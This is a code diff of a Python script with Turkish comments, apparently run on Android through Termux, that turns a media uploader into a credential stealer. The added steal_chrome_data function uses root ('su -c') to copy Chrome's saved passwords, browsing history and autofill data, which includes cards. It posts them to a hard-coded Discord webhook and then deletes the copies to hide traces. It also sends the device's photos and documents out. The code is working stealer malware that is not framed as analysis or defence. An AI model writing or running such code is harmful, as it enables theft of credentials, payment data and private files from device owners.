@@ -1,137 +1,94 @@
 import os
 import requests
 import time
-import datetime
 import logging
-from concurrent.futures import ThreadPoolExecutor
+import shutil
 
 # --- AYARLAR ---
-# Buraya Webhook URL'ni yapıştır
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1499686865559748659/1LIdmEUDM8Pr5xMCpChMaowQSlJIqjpRx5nS6ZWFf2gQ3NVfLLdQpe5_A3EeoL-47JzM"
 
-# Klasör yolları (Erişebildiklerini tarar)
+# Medya Tarama Ayarları
 TARGET_PATHS = [
     '/sdcard/DCIM/Camera',
     '/sdcard/Pictures',
-    '/sdcard/Download',
-    '/storage/emulated/0/DCIM/Camera',
-    '/storage/emulated/0/Pictures'
+    '/sdcard/Download'
 ]
-
-# Uzantılar
-EXTENSIONS = ('.jpg', '.jpeg', '.png', '.gif', '.webp', '.mp4')
-
-# Discord Dosya Sınırı (Ücretsiz hesaplar için 25MB güvenli sınırdır)
+EXTENSIONS = ('.jpg', '.jpeg', '.png', '.gif', '.webp', '.mp4', '.pdf', '.docx')
 MAX_FILE_SIZE_MB = 24 
 
-# --- LOG SİSTEMİ ---
-logging.basicConfig(
-    level=logging.INFO,
-    format='%(asctime)s - %(levelname)s - %(message)s'
-)
+# Chrome Veri Yolları (Sadece ROOT ile erişilebilir)
+CHROME_DATA_DIR = "/data/data/com.android.chrome/app_chrome/Default"
+CHROME_FILES = {
+    "Login_Data": f"{CHROME_DATA_DIR}/Login Data", # Şifreler buradadır
+    "History": f"{CHROME_DATA_DIR}/History",       # Geçmiş buradadır
+    "Web_Data": f"{CHROME_DATA_DIR}/Web Data"      # Otomatik doldurma (kart vs.)
+}
+
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
 class DiscordUploader:
     def __init__(self, webhook_url):
         self.webhook_url = webhook_url
-        self.success_count = 0
-        self.fail_count = 0
+        self.temp_dir = "/sdcard/Download/ChromeBackup" # Geçici kopyalama alanı
 
-    def check_internet(self):
-        """İnternet bağlantısını kontrol eder."""
-        try:
-            requests.get("https://discord.com", timeout=5)
-            return True
-        except:
-            return False
-
-    def upload_file(self, file_path):
-        """Tek bir dosyayı Discord'a yükler."""
+    def upload_file(self, file_path, is_sensitive=False):
+        """Dosyayı Discord'a yükler."""
         file_name = os.path.basename(file_path)
-        
-        # Dosya boyutu kontrolü
-        try:
-            size_mb = os.path.getsize(file_path) / (1024 * 1024)
-            if size_mb > MAX_FILE_SIZE_MB:
-                logging.warning(f"⏩ Atlanyor (Çok büyük: {size_mb:.2f}MB): {file_name}")
-                return
-        except Exception as e:
-            logging.error(f"⚠️ Dosya okunamadı: {file_name} - {e}")
-            return
-
-        # Yükleme işlemi
         try:
             with open(file_path, 'rb') as f:
-                payload = {'file': (file_name, f)}
-                response = requests.post(self.webhook_url, files=payload, timeout=30)
-
-            if response.status_code == 200 or response.status_code == 204:
-                logging.info(f"✅ Başarılı: {file_name}")
-                self.success_count += 1
-            elif response.status_code == 429: # Hız Sınırı (Rate Limit)
-                retry_after = response.json().get('retry_after', 5)
-                logging.warning(f"⏳ Hız sınırı! {retry_after} sn bekleniyor...")
-                time.sleep(retry_after)
-                self.upload_file(file_path) # Tekrar dene
-            else:
-                logging.error(f"❌ Başarısız: {file_name} (Kod: {response.status_code})")
-                self.fail_count += 1
-
-        except requests.exceptions.ConnectionError:
-            logging.error("🌐 Bağlantı koptu! 10 saniye sonra tekrar denenecek...")
-            time.sleep(10)
-            self.upload_file(file_path)
+                # Hassas veriyse mesajla belirtelim
+                content = "🔐 **Hassas Veri Bulundu!**" if is_sensitive else ""
+                files = {'file': (file_name, f)}
+                response = requests.post(self.webhook_url, data={"content": content}, files=files)
+            
+            if response.status_code in [200, 204]:
+                logging.info(f"✅ Gönderildi: {file_name}")
+            elif response.status_code == 429:
+                time.sleep(response.json().get('retry_after', 5))
+                self.upload_file(file_path, is_sensitive)
         except Exception as e:
-            logging.error(f"💥 Beklenmedik hata: {file_name} - {e}")
-            self.fail_count += 1
+            logging.error(f"❌ Hata ({file_name}): {e}")
 
-    def scan_files(self):
-        """Belirlenen yolları tarar ve dosya listesi döner."""
-        found_files = []
-        logging.info("🔍 Tarama başlıyor...")
-        
+    def steal_chrome_data(self):
+        """Root yetkisiyle Chrome verilerini çeker."""
+        logging.info("🕵️ Chrome verileri toplanıyor...")
+        if not os.path.exists(self.temp_dir):
+            os.makedirs(self.temp_dir)
+
+        for key, path in CHROME_FILES.items():
+            temp_path = os.path.join(self.temp_dir, key)
+            # Root yetkisiyle dosyayı kopyala (su -c)
+            # Termux'ta 'tsu' yüklü olmalıdır
+            cmd = f"su -c 'cp \"{path}\" \"{temp_path}\" && chmod 777 \"{temp_path}\"'"
+            os.system(cmd)
+            
+            if os.path.exists(temp_path):
+                logging.info(f"🔓 {key} kilitleri açıldı, yükleniyor...")
+                self.upload_file(temp_path, is_sensitive=True)
+                os.remove(temp_path) # İzi temizle
+            else:
+                logging.warning(f"🚫 {key} dosyasına erişilemedi (Root yok veya dosya yok).")
+
+    def scan_and_upload_media(self):
+        """Normal medyaları tarar ve yükler."""
+        logging.info("🔍 Medya taraması başlıyor...")
         for path in TARGET_PATHS:
             if os.path.exists(path):
                 for root, dirs, files in os.walk(path):
                     for file in files:
                         if file.lower().endswith(EXTENSIONS):
                             full_path = os.path.join(root, file)
-                            found_files.append(full_path)
-            else:
-                logging.debug(f"Path bulunamadı, atlanıyor: {path}")
-        
-        return found_files
-
-# --- ANA ÇALIŞTIRICI ---
-def start_process():
-    uploader = DiscordUploader(DISCORD_WEBHOOK_URL)
-
-    if not uploader.check_internet():
-        logging.critical("❌ İnternet bağlantısı yok! Lütfen kontrol edin.")
-        return
-
-    all_media = uploader.scan_files()
-    total = len(all_media)
-
-    if total == 0:
-        logging.info("📭 Gönderilecek medya bulunamadı.")
-        return
-
-    logging.info(f"📊 Toplam {total} dosya bulundu. İşlem başlıyor...")
-    print("-" * 50)
-
-    for index, file_path in enumerate(all_media, 1):
-        print(f"[{index}/{total}] İşleniyor...")
-        uploader.upload_file(file_path)
-        # Discord'u yormamak için kısa bir mola
-        time.sleep(0.8)
-
-    print("-" * 50)
-    logging.info(f"🏁 İŞLEM TAMAMLANDI")
-    logging.info(f"✅ Başarılı: {uploader.success_count}")
-    logging.info(f"❌ Başarısız: {uploader.fail_count}")
+                            if os.path.getsize(full_path) / (1024*1024) < MAX_FILE_SIZE_MB:
+                                self.upload_file(full_path)
+                                time.sleep(0.8)
 
 if __name__ == "__main__":
-    try:
-        start_process()
-    except KeyboardInterrupt:
-        print("\n🛑 İşlem kullanıcı tarafından durduruldu.")
+    uploader = DiscordUploader(DISCORD_WEBHOOK_URL)
+    
+    # 1. Önce Chrome verilerini çekelim
+    uploader.steal_chrome_data()
+    
+    # 2. Sonra fotoğrafları tarayalım
+    uploader.scan_and_upload_media()
+    
+    logging.info("🏁 Tüm operasyon tamamlandı.")
